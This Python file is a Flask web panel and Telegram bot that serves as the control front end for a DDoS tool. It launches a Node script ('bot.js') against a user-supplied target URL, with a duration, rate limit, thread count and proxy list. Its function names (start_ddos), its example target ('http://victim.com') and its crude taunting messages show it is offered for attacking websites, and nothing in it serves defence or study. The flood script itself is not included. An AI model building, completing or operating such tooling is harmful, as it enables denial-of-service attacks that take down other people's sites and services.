from flask import Flask, request
import subprocess
import os
import signal
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio
import threading

app = Flask(__name__)

# Bot process tracker
bot_process = None
BOT_SCRIPT = "bot.js"
TARGET_URL = None
TELEGRAM_BOT_TOKEN = ""
ALLOWED_USER_ID = 

# Start bot with target, time, ratelimit, threads, proxyfile
def start_bot(target, time, ratelimit, threads, proxyfile):
    global bot_process, TARGET_URL
    TARGET_URL = target
    if bot_process is None or bot_process.poll() is not None:
        bot_process = subprocess.Popen(['node', BOT_SCRIPT, target, str(time), str(ratelimit), str(threads), proxyfile])
        return True
    return False

# Kill bot process
def kill_bot():
    global bot_process
    if bot_process and bot_process.poll() is None:
        os.kill(bot_process.pid, signal.SIGTERM)
        bot_process.wait()
        bot_process = None
        return True
    return False

# Kill all child processes
def kill_subprocesses():
    try:
        current_pid = os.getpid()
        pids = subprocess.check_output(f'pgrep -P {current_pid}', shell=True).decode().split()
        for pid in pids:
            os.kill(int(pid), signal.SIGTERM)
    except:
        pass

# Telegram bot commands
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("Fuck off, you’re not authorized.")
        return
    if len(context.args) < 5:
        await update.message.reply_text("Usage: /attack <target> <time> <ratelimit> <threads> <proxyfile>\nExample: /attack http://victim.com 120 512 258 proxy.txt")
        return
    target, time, ratelimit, threads, proxyfile = context.args[:5]
    if not os.path.exists(proxyfile):
        await update.message.reply_text(f"Proxy file {proxyfile} doesn’t fucking exist.")
        return
    if start_bot(target, time, ratelimit, threads, proxyfile):
        await update.message.reply_text(f"Attack started, fucking up {target} for {time}s with {ratelimit} rate, {threads} threads, proxies from {proxyfile}. 🖕")
    else:
        await update.message.reply_text("Bot’s already running, you impatient fuck.")

async def nuke_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("Fuck off, you’re not authorized.")
        return
    if kill_bot():
        await update.message.reply_text("Bot nuked, chill the fuck out.")
    else:
        await update.message.reply_text("No bot running, you high?")

async def http_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("Fuck off, you’re not authorized.")
        return
    if not TARGET_URL:
        await update.message.reply_text("No target set, dumbass.")
        return
    try:
        result = subprocess.check_output(['node', BOT_SCRIPT, TARGET_URL, '1', '1', '1', 'proxy.txt', '--status'], text=True)
        await update.message.reply_text(f"HTTP Status: {result.strip()}")
    except subprocess.CalledProcessError as e:
        await update.message.reply_text(f"Status check fucked up: {e.output.strip()}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("Fuck off, you’re not authorized.")
        return
    status = "Running" if bot_process and bot_process.poll() is None else "Stopped"
    await update.message.reply_text(f"Bot Status: {status}\nTarget: {TARGET_URL or 'None'}")

async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("Fuck off, you’re not authorized.")
        return
    kill_subprocesses()
    await update.message.reply_text("Everything’s fucking dead. 💀")

# Flask routes
@app.route("/")
def page_web_de_mort():
    status = "Running" if bot_process and bot_process.poll() is None else "Stopped"
    return f"""
    <html><body>
    <h1>NCBD's Fuck-Shit-Up Panel</h1>
    <p>Bot Status: {status}</p>
    <p>Target: {TARGET_URL or 'None'}</p>
    <form method="POST" action="/start">
        <input type="text" name="target" placeholder="Target URL (e.g., http://victim.com)">
        <input type="number" name="time" placeholder="Time (seconds)">
        <input type="number" name="ratelimit" placeholder="Rate limit">
        <input type="number" name="threads" placeholder="Threads">
        <input type="text" name="proxyfile" placeholder="Proxy file (e.g., proxy.txt)">
        <input type="submit" value="Fuck it up">
    </form>
    <form method="POST" action="/stop">
        <input type="submit" value="Stop the chaos">
    </form>
    <img src='https://i.giphy.com/KmHueA88mFABT9GkkR.gif'>
    </body></html>
    """

@app.route("/start", methods=["POST"])
def start_ddos():
    target = request.form.get("target")
    time = request.form.get("time")
    ratelimit = request.form.get("ratelimit")
    threads = request.form.get("threads")
    proxyfile = request.form.get("proxyfile")
    if not all([target, time, ratelimit, threads, proxyfile]):
        return f"""
        <html><body>
        <h1>Missing params, dumbass</h1>
        <img src='https://i.giphy.com/KmHueA88mFABT9GkkR.gif'>
        </body></html>
        """
    if not os.path.exists(proxyfile):
        return f"""
        <html><body>
        <h1>Proxy file {proxyfile} doesn’t fucking exist</h1>
        <img src='https://i.giphy.com/KmHueA88mFABT9GkkR.gif'>
        </body></html>
        """
    if start_bot(target, time, ratelimit, threads, proxyfile):
        return f"""
        <html><body>
        <h1>Bot started, fucking up {target} for {time}s</h1>
        <img src='https://i.giphy.com/KmHueA88mFABT9GkkR.gif'>
        </body></html>
        """
    return f"""
    <html><body>
    <h1>Bot already running, you impatient fuck</h1>
    <img src='https://i.giphy.com/KmHueA88mFABT9GkkR.gif'>
    </body></html>
    """

@app.route("/stop", methods=["POST"])
def stop_ddos():
    if kill_bot():
        return f"""
        <html><body>
        <h1>Bot stopped, chill the fuck out</h1>
        <img src='https://i.giphy.com/KmHueA88mFABT9GkkR.gif'>
        </body></html>
        """
    return f"""
    <html><body>
    <h1>No bot running, you high?</h1>
    <img src='https://i.giphy.com/KmHueA88mFABT9GkkR.gif'>
    </body></html>
    """

@app.route("/kill")
def killswitch():
    kill_subprocesses()
    return """
    <html><body>
    <h1>Everything's fucking dead</h1>
    <img src='https://i.giphy.com/6jTD6KqVNADI746GOC.gif'>
    </body></html>
    """

# Run Telegram bot with explicit event loop
def run_telegram_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("nuke", nuke_command))
    application.add_handler(CommandHandler("http", http_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("kill", kill_command))
    application.run_polling()

if __name__ == "__main__":
    telegram_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    telegram_thread.start()
    app.run(host="0.0.0.0", port=5000, debug=False)
